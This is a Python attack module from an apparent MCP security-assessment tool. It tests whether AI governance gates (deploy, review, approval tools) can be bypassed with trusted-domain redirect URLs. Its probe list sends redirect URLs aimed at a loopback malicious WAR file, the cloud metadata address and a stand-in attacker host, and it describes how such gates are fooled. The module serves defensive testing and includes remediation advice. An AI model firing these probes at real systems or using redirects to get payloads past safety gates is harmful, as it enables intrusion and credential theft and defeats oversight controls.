"""MCP-T41: AI Governance Gate Bypass via Trusted Redirect.

AI governance gates (deployment reviewers, content filters, safety layers)
often maintain an allowlist of trusted domains for fetching policy documents,
WAR files, or tool payloads. If the gate validates only the *initial* URL and
not the *final* redirect destination, an attacker can serve a malicious payload
from an attacker-controlled endpoint that is reachable via a trusted redirect.

Pattern: legitimate-domain.example.com/redirect?to=<attacker-url>
The gate sees "legitimate-domain" (allowlisted) and approves;
the actual content comes from the attacker's server.

This module inspects AI gate tools (deploy, review, approve, validate) for
URL parameters and checks whether redirect chains bypass the allowlist check.

Maps to MCP-T41 (AI Governance Gate Bypass) / OWASP MCP02 (Privilege
Escalation — gate bypass) + MCP07 (Insufficient Authentication).
"""

from __future__ import annotations

import re
from typing import ClassVar

from mcp_slayer.models import AttackCategory, AttackOutcome, Finding, Severity
from mcp_slayer.modules.base import AttackModule
from mcp_slayer.taxonomy import PlaybookThreatID

_TOOLS_LIST = {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}

# Tool name patterns suggesting a governance/approval gate.
_GATE_TOOL_RE = re.compile(
    r"(?i)(deploy|approve|validate|review|submit|check|verify|scan|analyze|gate)"
    r".{0,20}(war|artifact|policy|content|url|image|package|payload|build)"
)

# Schema parameter patterns accepting URLs.
_URL_PARAM_RE = re.compile(
    r"(?i)^(url|war_url|artifact_url|source|endpoint|target|location|uri|href)$"
)

# Redirect-vector URLs — trusted domains that forward to arbitrary targets.
# In a real assessment these are populated from the target's allowlist;
# here we use generic redirect service patterns as proof-of-concept.
_REDIRECT_PROBES: list[tuple[str, str]] = [
    ("https://internal.warbird.ks/redirect?to=http://127.0.0.1:8080/malicious.war",
     "internal-redirect-loopback"),
    ("https://trusted.example.com/redirect?url=http://169.254.169.254/latest/meta-data/",
     "trusted-redirect-imds"),
    ("https://cdn.example.com/assets?src=http://attacker.test/payload",
     "cdn-redirect-attacker"),
]

# Signals in response that the gate evaluated the initial (trusted) URL.
_GATE_ACCEPT_RE = re.compile(
    r"(?i)(approved|accepted|validated|submitted|deployed|ok\b|success|✓)"
)
_GATE_REJECT_RE = re.compile(
    r"(?i)(reject|denied|blocked|not allowed|invalid|forbidden|unsafe|redirect)"
)


def _call(name: str, param: str, value: str) -> dict:
    return {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {"name": name, "arguments": {param: value}},
    }


class GovernanceGateBypassModule(AttackModule):
    """Probes AI governance gate tools for redirect-based allowlist bypass.

    Submits URLs that start at a trusted domain but redirect to an attacker-
    controlled or IMDS endpoint. Pass = gate validates final destination or
    rejects redirect chains. Fail = gate approves based on initial URL.
    """

    id: ClassVar[str] = "governance-gate-bypass"
    name: ClassVar[str] = "AI Governance Gate Bypass via Trusted Redirect"
    owasp_category: ClassVar[AttackCategory] = AttackCategory.PRIVILEGE_ESCALATION
    playbook_threats: ClassVar[list[PlaybookThreatID]] = [
        PlaybookThreatID.AI_GOVERNANCE_GATE_BYPASS,
    ]
    description: ClassVar[str] = (
        "Tests AI governance gate tools for redirect-chain bypass: submits "
        "trusted-domain URLs that redirect to attacker-controlled targets."
    )
    severity_range: ClassVar[tuple[Severity, Severity]] = (
        Severity.HIGH,
        Severity.CRITICAL,
    )

    async def run(self) -> list[Finding]:
        findings: list[Finding] = []
        for tool in self.ctx.config.tools:
            tool_findings = await self._execute_with_safeguards(
                self._probe_tool, tool
            )
            findings.extend(tool_findings)
        return findings

    async def _probe_tool(self, tool) -> list[Finding]:
        base = str(tool.base_url).rstrip("/")
        for ep in tool.schema_endpoints:
            url = f"{base}{ep}"
            async with self.ctx.http_client.post(
                url, json=_TOOLS_LIST,
                headers=self.ctx.get_auth_headers(tool.auth_profile),
            ) as r:
                if r.status != 200:
                    continue
                body = await r.json(content_type=None)

            result = body.get("result", body)
            tools = result.get("tools", []) if isinstance(result, dict) else []
            findings: list[Finding] = []

            for entry in tools:
                if not isinstance(entry, dict):
                    continue
                name = entry.get("name", "")
                if not _GATE_TOOL_RE.search(name):
                    continue
                schema = entry.get("inputSchema", {})
                props = schema.get("properties", {}) if isinstance(schema, dict) else {}
                url_param = next((k for k in props if _URL_PARAM_RE.match(k)), None)
                if not url_param:
                    continue

                # Static surface finding.
                findings.append(self._static_finding(tool, url, name, url_param))

                # Behavioral probes.
                for redirect_url, probe_label in _REDIRECT_PROBES:
                    f = await self._test_redirect(
                        tool, url, name, url_param, redirect_url, probe_label
                    )
                    if f:
                        findings.append(f)
            return findings
        return []

    def _static_finding(self, tool, endpoint: str, tool_name: str, param: str) -> Finding:
        return self._create_finding(
            title=f"Governance gate with URL parameter: '{tool_name}' on '{tool.name}'",
            severity=Severity.HIGH,
            target_url=endpoint,
            outcome=AttackOutcome.PARTIALLY_VULNERABLE,
            target_tool=tool_name,
            description=(
                f"Tool '{tool_name}' accepts a URL parameter ('{param}') and "
                f"appears to be a governance or approval gate. If the gate validates "
                f"only the initial URL and not the final redirect destination, "
                f"redirect chains can bypass allowlist controls."
            ),
            impact=(
                "Malicious payload served from an attacker-controlled endpoint "
                "approved by the gate because the initial URL belongs to a trusted domain."
            ),
            recommendation=(
                "Resolve all redirect chains before allowlist evaluation. "
                "Pin final destination, not initial URL. Disable follows to "
                "private/loopback/IMDS addresses. Consider signed URL tokens "
                "to prevent URL manipulation."
            ),
            evidence={"tool_name": tool_name, "url_param": param},
            blue_team_signal="D12: governance gate with URL parameter — redirect risk",
        )

    async def _test_redirect(
        self, tool, endpoint: str, tool_name: str, param: str,
        redirect_url: str, probe_label: str
    ) -> Finding | None:
        try:
            async with self.ctx.http_client.post(
                endpoint,
                json=_call(tool_name, param, redirect_url),
                headers=self.ctx.get_auth_headers(tool.auth_profile),
            ) as r:
                resp = await r.text()
                status = r.status
        except Exception:
            return None

        if _GATE_REJECT_RE.search(resp):
            return None  # Gate correctly rejected redirect.

        if status in (200, 201) and _GATE_ACCEPT_RE.search(resp):
            return self._create_finding(
                title=(
                    f"Gate bypass via {probe_label}: '{tool_name}' approved "
                    f"redirect-chain URL"
                ),
                severity=Severity.CRITICAL,
                target_url=endpoint,
                outcome=AttackOutcome.VULNERABLE,
                target_tool=tool_name,
                description=(
                    f"Tool '{tool_name}' approved a URL ({redirect_url}) that "
                    f"redirects to a non-trusted target. Probe: {probe_label}. "
                    f"The gate did not resolve the redirect chain before evaluation."
                ),
                impact=(
                    "Attacker can deliver arbitrary payloads (WARs, configs, policies) "
                    "through a trusted-domain redirect, bypassing allowlist controls "
                    "and potentially gaining code execution or credential access."
                ),
                recommendation=(
                    "Resolve all HTTP redirects server-side before allowlist evaluation. "
                    "Block redirect to RFC-1918, loopback, and IMDS ranges. "
                    "Use content-hash pinning for deployable artifacts."
                ),
                evidence={
                    "tool_name": tool_name,
                    "probe": probe_label,
                    "url": redirect_url,
                    "http_status": status,
                    "response_snippet": resp[:80],
                },
                blue_team_signal="D12: CRITICAL — gate approved redirect-chain bypass",
            )
        return None
